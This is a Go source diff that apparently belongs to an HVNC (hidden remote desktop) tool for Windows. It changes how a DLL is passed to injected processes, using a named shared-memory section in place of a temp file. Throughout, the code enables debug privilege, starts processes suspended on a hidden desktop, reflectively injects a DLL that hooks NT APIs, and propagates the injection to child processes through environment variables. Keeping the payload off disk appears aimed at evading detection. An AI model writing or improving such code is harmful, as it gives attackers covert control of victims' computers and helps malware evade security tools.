@@ -26,6 +26,9 @@ var (
 	procOpenProcessToken      = advapi32.NewProc("OpenProcessToken")
 	procLookupPrivilegeValueW = advapi32.NewProc("LookupPrivilegeValueW")
 	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
+	procCreateFileMappingW    = kernel32.NewProc("CreateFileMappingW")
+	procMapViewOfFile         = kernel32.NewProc("MapViewOfFile")
+	procUnmapViewOfFile       = kernel32.NewProc("UnmapViewOfFile")
 )
 
 var advapi32 = syscall.NewLazyDLL("advapi32.dll")
@@ -605,18 +608,20 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, searchPa
 		return fmt.Errorf("empty DLL bytes")
 	}
 
-	dllTmpPath, err := writeDLLToTemp(dllBytes)
+	// Create a page-file-backed named section containing the raw DLL bytes.
+	// Child processes will open this section to reflectively inject themselves.
+	shmHandle, shmName, err := createDLLSharedMemory(dllBytes)
 	if err != nil {
-		return fmt.Errorf("failed to write DLL to temp: %v", err)
+		return fmt.Errorf("failed to create DLL shared memory: %v", err)
 	}
-	log.Printf("hvnc inject: DLL written to %s for child injection", dllTmpPath)
+	log.Printf("hvnc inject: DLL shared memory created as %s (%d bytes)", shmName, len(dllBytes))
 
 	enableDebugPrivilege()
 
 	// Create the process suspended on the HVNC desktop
-	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, dllTmpPath)
+	hProcess, hThread, pid, err := createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName, len(dllBytes))
 	if err != nil {
-		os.Remove(dllTmpPath)
+		procCloseHandle.Call(shmHandle)
 		return fmt.Errorf("failed to create suspended process: %v", err)
 	}
 	log.Printf("hvnc inject: created suspended process PID %d", pid)
@@ -625,11 +630,16 @@ func startHVNCProcessInjectedOnThread(filePath string, dllBytes []byte, searchPa
 	if err := reflectiveInject(hProcess, dllBytes); err != nil {
 		procCloseHandle.Call(hProcess)
 		procCloseHandle.Call(hThread)
-		// Try to kill the process
 		terminateProcess(hProcess)
+		procCloseHandle.Call(shmHandle)
 		return fmt.Errorf("DLL injection failed: %v", err)
 	}
 	log.Printf("hvnc inject: DLL injected into PID %d", pid)
+
+	// The DLL's InstallNtApiHooks has run (reflectiveInject waits for the
+	// loader thread). The DLL opened the shared section, so we can release
+	// our handle now.
+	procCloseHandle.Call(shmHandle)
 
 	procCloseHandle.Call(hProcess)
 
@@ -649,21 +659,46 @@ func terminateProcess(hProcess uintptr) {
 	kernel32.NewProc("TerminateProcess").Call(hProcess, 1)
 }
 
-func writeDLLToTemp(dllBytes []byte) (string, error) {
-	f, err := os.CreateTemp("", "hvnc_rdi_*.dll")
+// createDLLSharedMemory creates a named page-file-backed section containing
+// the raw DLL bytes. Returns the mapping handle and section name.
+func createDLLSharedMemory(dllBytes []byte) (handle uintptr, name string, err error) {
+	name = fmt.Sprintf("Local\\hvnc_rdi_%d", time.Now().UnixNano())
+	namePtr, err := syscall.UTF16PtrFromString(name)
 	if err != nil {
-		return "", err
+		return 0, "", err
 	}
-	if _, err := f.Write(dllBytes); err != nil {
-		f.Close()
-		os.Remove(f.Name())
-		return "", err
+
+	size := len(dllBytes)
+	handle, _, callErr := procCreateFileMappingW.Call(
+		^uintptr(0), // INVALID_HANDLE_VALUE
+		0,           // default security
+		0x04,        // PAGE_READWRITE
+		0,           // high-order size
+		uintptr(size),
+		uintptr(unsafe.Pointer(namePtr)),
+	)
+	if handle == 0 {
+		return 0, "", fmt.Errorf("CreateFileMappingW: %v", callErr)
 	}
-	f.Close()
-	return f.Name(), nil
+
+	view, _, callErr := procMapViewOfFile.Call(
+		handle,
+		0x2, // FILE_MAP_WRITE
+		0, 0,
+		uintptr(size),
+	)
+	if view == 0 {
+		procCloseHandle.Call(handle)
+		return 0, "", fmt.Errorf("MapViewOfFile: %v", callErr)
+	}
+
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(view)), size), dllBytes)
+
+	procUnmapViewOfFile.Call(view)
+	return handle, name, nil
 }
 
-func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, dllTmpPath string) (hProcess, hThread uintptr, pid uint32, err error) {
+func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName string, dllSize int) (hProcess, hThread uintptr, pid uint32, err error) {
 	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to convert desktop name: %v", err)
@@ -690,7 +725,7 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, dllTmpPa
 	si.dwY = 0
 	si.dwFlags = STARTF_USEPOSITION
 
-	envBlock, err := buildEnvironmentBlock(searchPath, replacePath, dllTmpPath)
+	envBlock, err := buildEnvironmentBlock(searchPath, replacePath, shmName, dllSize)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to build environment block: %v", err)
 	}
@@ -717,13 +752,14 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, dllTmpPa
 	return pi.hProcess, pi.hThread, pi.dwProcessId, nil
 }
 
-func buildEnvironmentBlock(searchPath, replacePath, dllTmpPath string) ([]uint16, error) {
+func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int) ([]uint16, error) {
 	envStrings := syscall.Environ()
 
 	envStrings = append(envStrings, "RDI_SEARCH_PATH="+searchPath)
 	envStrings = append(envStrings, "RDI_REPLACE_PATH="+replacePath)
-	if dllTmpPath != "" {
-		envStrings = append(envStrings, "RDI_DLL_PATH="+dllTmpPath)
+	if shmName != "" {
+		envStrings = append(envStrings, "RDI_DLL_SECTION="+shmName)
+		envStrings = append(envStrings, fmt.Sprintf("RDI_DLL_SIZE=%d", dllSize))
 	}
 
 	var block []uint16
